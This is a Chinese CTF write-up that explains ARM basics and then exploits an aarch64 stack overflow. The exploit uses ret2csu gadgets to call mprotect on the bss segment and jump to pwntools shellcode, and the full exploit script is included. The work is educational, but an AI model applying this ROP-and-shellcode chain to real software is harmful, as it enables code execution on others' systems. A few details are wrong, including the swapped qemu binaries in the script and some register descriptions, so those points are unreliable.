0x00前置知识
========

ARM数据类型和寄存器
-----------

### 数据类型

与高级语言类似，ARM支持对不同的数据类型的操作，通常是与ldr、str这类存储加载指令一起使用：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-32eb25d0d4880e6d187bf0f27052557a2d35f42a.png)

### 字节序

在x86下的字序分为，大端序和小端序。这两个实际上是区别于对象的每个字节在内存中的存储顺序

ARM体系结构在版本3之前是碲酸字节序的，因为那时它是双向字节序的，这意味着它具有允许可切换字序的设置。

### 寄存器

寄存器的数量取决于ARM版本，ARM32有30个通用寄存器（基于ARMv6-M和ARMv7-M的处理器除外），前16个寄存器可在用户级模式下访问，其他寄存器可在特权软件执行中使用

其中，r0-15寄存器可在任何特权模式下访问。这16个寄存器可以分为两组：通用寄存器（R0-R11）和专用寄存器（R12-R15）

在32位下，R0在算数操作期间可称为累加器，或用于存储先前调用的函数结果。R7在处理器系统调用时非常有用，因为他存储的系统调用号。R11帮助我们跟踪用作帧指针的堆栈的边界。ARM平台上的函数调用约定指定函数前4个参数存储在寄存器r0-r3中

piao网上的图：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-10b6cefb50fd1fe2cae6b54d737556f922a8cdeb.png)

R13：sp（堆栈指针）类似于esp、R14：lr（链接寄存器）、R15：pc（程序计数器）

ARM与x86的对比：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-6d4736159654ca1e357e28cfbac4912a37cd3f13.png)

#### 32位ARM的约定

1．当参数少于4个时，子程序间通过寄存器RO-R3来传递参数;当参数个数多于4个时，将多余的参数通过数据栈进行传递，入栈顺序与参数顺序正好相反，子程序返回前无需恢复RO-R3的值&lt;br /&gt;2.在子程序中，使用R4~R11保存局部变量，若使用需要入栈保存，子程序返回前需要恢复这些寄存器;R12是临时寄存器，使用不需要保存&lt;br /&gt;3. R13用作数据帧指针，记作SP;R14用作链接寄存器，记作LR，用于保存子程序返回时的地址;R15是程序计数器，记作PC&lt;br /&gt;4. ATPCS规定堆栈是满递减堆栈FD;返回32位的整数，使用RO返回;返回G位，R1返回高位

#### 64位ARM的约定

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-8af436bf7720c4625b2492d01a65266e3cd9821e.png)

另：子程序调用时必须要保存的寄存器：X19-X29和SP（X31）、不需要保存的寄存器:XO-X7、X9-X15

### 32位与64位寄存器的差异

```php
栈arm32下，前4个参数是通过r0-r3传递，第4个参数需要通过sp访问，第五个参数需要通过sp+4访问，以此类推

arm64下，前8个参数时通过x0-x7传递，第9个参数需要通过sp访问，第10个参数需要通过sp+8访问，以此类推

ARM指令在32位和64位下并不是完全是一致的，但大部分指令时通用的。

还有一些32位存在的指令在64位下是不存在的，比如vswp。
```

ARM指令集
------

ARM处理器具有两种可以运行的主要状态：ARM、Thumb

这两种状态之间的主要区别是指令集，其中ARM状态下的指令始终为32位，Thumb状态下的指令集始终为16位

在编写ARM shellcode时，我们需要摆脱NULL字节，并使用16位Thumb指令而不是32位ARM指令来减少它们的机会。

### ARM指令简介

汇编语言由指令构成，而指令是主要的构建块。ARM指令通常后跟一个或两个操作数，并且通常使用一下模板：

```·
MNEMONIC {S} {condition} {Rd}，Operand1，Operand2
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-a2c7ba2751258048d900d8163f14e8ea4b5ef4d6.png)

由于ARM指令集的灵活性，并非所有指令都使用模板中提供的所有字段。其中，条件字段与CPSR寄存器的值紧密相关，或者确切的说，与寄存器内特定位的值紧密相关

32位ARM指令

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-d286f88faee8adcb8081871cac19b9ca6f40f23e.png)

因为ARM使用加载存储模型进行内存访问，这意味着只有加载/存储（LDR和STR）指令才能访问内存

通常，LDR用于将某些内容从内存加载带寄存器中，而STR用于将某些内容从寄存器存储到内存之中

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-e3cbd26b8c4925d42159b7009dbdd60f10db03b7.png)

条件执行

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-a653dfc2d40261171c532d8a79ee76e9e2d6009c.png)

ARM32与ARM64常用指令对应关系

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-ce8119bc7679e5c80431f56ada4b979b03128823.png)

0x01查看程序信息
==========

64位程序，ARM框架，动态链接。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-492c6554e7c7fe4aaf57bae162adac71c063a7d0.png)

查看保护机制：

只开启了NX保护，还有部分RELRO

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-4b5a02dd4a8835cbcaa8d7a20804871ed3484450.png)

0x02动态分析一下程序
============

是ARM框架下的题目，要用qemu模拟运行一下，一共是两个输入点，第一个输入点powercat，第二个输入点cat，单是这样猜测的话，程序的漏洞极有可能是栈溢出。在静态分析之前先对两个输入点进行一个测试。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-3989b419d461fb1fad0e0b6d7a1112d497fd2e3a.png)

第一个输入点：

这样看来，栈溢出的点应该不在第一个输入点，应该是第二个输入点存在漏洞吧。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-e7de1c7f531431519e3490038bce86b644c46055.png)

第二个输入点：不错，应该是在意料之内，输入较长的字符串会出现Segmentation fault的报错，应该这就是栈溢出的输入点。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-1c95fa0795dbe00bfc36129acef9163c4fa28578.png)

0x03静态分析
========

main函数，很简单的，代码量很少。大概就是输入名字之后（name存储在bss段上，然后进入函数sub\_4007F0

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-1a80b70cbf9703f1e0864793c688b187044bbb8b.png)

bss段上的全局变量unk\_411068

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-befb47cd2585f4d983bc4c22cd0c0dc501dd9242.png)

进入函数sub\_4007F0查看，v1所占的空间并不大而我们能够输入0x200的数据就能够干好多事情。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-3b8052408483882a60cf3c2569e9b0566ef85d41.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-4decc0033e91ac4d2e8fcc1345d42fd4e43b5bbe.png)

我们在查看函数的时候，发现了mprotect函数，这算是比较走运的，可以利用这个函数将bss的权限设置成可读可写可执行，函数的使用方法如下：

```python
int mprotect(const void *start, size_t len, int prot);
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-d13fb971ad1881765d0b4848602df6abd27a6afb.png)

0x04利用思路
========

可以先将构造出的shellcode利用第一个输入点传入到bss段上，然后利用mmprotect将bss段设置成可执行的。之后利用栈溢出将执行流到bss段。首先要考虑的就是传参问题，64位下arm和x86框架下的函数传参是不一样的。在x86\_64的框架下，函数调用约定是从第一个到第六个参数，按顺序是在寄存器rdi、rsi、rdx，rcx，r8，r9，从第七个参数开始就从stack中按照先进后出的规律进行取参。在ARM框架下，函数调用约定传参，当参数少于4个参数的时候是通过寄存器r0-r3来传参，多于四个参数的时候就开始利用stack内传参。其实这种题目除了程序的调试方法之外，还有汇编的一些不同，其他的情况下做题思路和方法都是和x86框架下的题目都是一样的。

所以我们在利用mprotect函数的时候传参是利用r0，r1，r2这三个寄存器。利用之后将函数的返回地址指向shellcode的地方

着手做
---

首先要解决的问题是怎么传参，将参数传入寄存器中，类比x86框架下的题目利用，这时我们需要去寻找一个或者几个gadget将参数传递到相应的参数寄存器中。

一开始我利用ROPgadget去寻找一些对应寄存器的gadget，不过很可惜找不到然后我就去巴拉巴拉ida汇编窗口（其实我并没有发现什么，我是看了wp之后才意识到这两段汇编是不正常的（确实是arm框架下的汇编不太熟练。一开始看到arm汇编没有意识到，将其转化为x86形式的汇编看起来就不错，这就是之前见到过的ret2csu利用方式。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-fa8d7650f77fc9fa2247cef00faea443440f951c.png)

来一段一段的去分析，我们姑且先叫下面的汇编代码段为：gadget1、上面的汇编代码段为gadget2。

整体上来说ret2csu的过程就是，先从栈上将数据写入到寄存器当中，然后通过寄存器之间的传输将参数传入相应的寄存器中。通过分析上面的函数传递关系发现：sp+0x30位置是参数二、sp+0x38的位置是参数一、sp+0x20的位置是参数三。这样我们在第二个输入点输入数据的时候就可以调整一下数据的位置来将相应的参数传入到相应的寄存器当中。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-0d9c61f7a77783e672299cd761c2bddf61d15645.png)

还有一点就是在gadget2中，x19+1会和x20进行比较，需要满足x19+1=x20才能使程序不去跳转至loc\_400BAC.

然后需要搞清楚每个参数是什么，同样先回到mprotect本身

```python
int mprotect(const void *start, size_t len, int prot);
```

x0参数一，是bss段中shellcode的起始地址。

x1参数二，从shellocde起始地址开始赋予可执行权限的大小。

x2参数三，权限所对应的代码

x3跳转执行的函数地址

掌握到了对应的寄存器需要的参数，就可以根据传参的对应关系去寻找到相应的位置去写入对应的参数

参数一写入sp+0x38，参数二写入sp+0x30，参数三写入sp+0x20

在此之后开始分析栈内的情况：

分配给栈内变量的大小只有这么多，所以需要有72即0x48的垃圾数据来填充上。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-af1c5f365f0c485e65fa2c7f88b3f43dc476fc7a.png)

将返回地址设置成gadget1来将参数传入到寄存器里面，此时ret+8的地址为sp。按照前面所分析的位置信息我们不难得出payload的结构

```python
payload = 'a'*0x48
payload += p64(gadget1)#sp-0x8
payload += p64(0)#sp 填入垃圾数据即可
payload += p64(gadget2)#sp+0x8 填入执行完gadget1所要返回的地址
payload += p64(0x0)#sp+0x10 之后会传入x19+1和x20进行比较
payload += p64(0x1)#sp+0x18 传入x20与x19+1进行比较
payload += p64(mprotect_addr)#sp+0x20,传入寄存器x3中在执行gadget2的时候跳转执行（已经是在传参完成之后
payload += p64(0x7)#sp+0x28 函数mprotect的权限代码
payload += p64(0x1000)#sp+0x30 获得权限的范围
payload += p64(0)#垃圾数据占位
payload += p64(shellcode_addr)#最后返回到shellcode去执行
```

部署shellcode
-----------

利用第一个输入点，将shellcode写入到bss段中：

这里需要注意的使在利用pwntools进行shellcode生成的时候，不能习惯的使用x86框架下的生成方式shellcraft.sh()生成的默认是x86下的shellcode，在arm框架下去执行其实并不奏效，这也是我在做arm的时候踩到的一些坑。

```python
shellcode = asm(shellcraft.aarch64.sh())
payload = ''
payload += p64(mprotect)
payload += shellcode
sl(payload)
```

这样的话很容易就能总结出exp来：

exp
---

```python
#encoding = utf-8
import sys
import time
from pwn import *
from LibcSearcher import * 

context.log_level = "debug"
context.arch = 'aarch64'
context.os = 'linux'

binary = "pwn"
libcelf = ""
ip = ""
port = ""
local = 1
arm = 1
core = 64

og = [0x4342,0x3342]

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\x00'))
uu64    = lambda data               :u64(data.ljust(8,'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

if(local==1):
    if(arm==1):
        if(core==64):
            p = process(["qemu-arm", "-g", "1212", "-L", "/usr/arm-linux-gnueabi",binary])
        if(core==32):
            p = process(["qemu-aarch64", "-g", "1212", "-L", "/usr/aarch64-linux-gnu/", binary])
    else:
        p = process(binary)
else:
    p = remote(ip,port)

elf = ELF(binary)
libc = ELF(libcelf)

mprotect_plt = elf.plt['mprotect']
gadget1 = 0x4008CC
gadget2 = 0x4008AC
mprotect_addr = 0x411068#bss
shellcode_addr = 0x411070
shellcode = asm(shellcraft.aarch64.sh())

def pwn():
    payload = p64(mprotect_plt)
    payload += shellcode
    sa('Name:',payload)

    payload = 'a'*0x48
    payload += p64(gadget1)#sp-0x8
    payload += p64(0)#sp 填入垃圾数据即可
    payload += p64(gadget2)#sp+0x8 填入执行完gadget1所要返回的地址
    payload += p64(0x0)#sp+0x10 之后会传入x19+1和x20进行比较
    payload += p64(0x1)#sp+0x18 传入x20与x19+1进行比较
    payload += p64(mprotect_addr)#sp+0x20,传入寄存器x3中在执行gadget2的时候跳转执行（已经是在传参完成之后
    payload += p64(0x7)#sp+0x28 函数mprotect的权限代码
    payload += p64(0x1000)#sp+0x30 获得权限的范围
    payload += p64(0)#垃圾数据占位
    payload += p64(shellcode_addr)#最后返回到shellcode去执行

    s(payload)
    itr()

#爆破
'''
i = 0
while 1:
    i += 1
    log.warn(str(i))
    try:
        pwn()
    except Exception:
        p.close()
        if(local == 1):
            p = process(binary)
        else:
            p = remote(ip,port)
        continue
'''

if __name__ == '__main__':
    pwn()
```

运行结果：

奏效！

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/02/attach-3b1406ae10b51620591c1626f63d333564617325.png)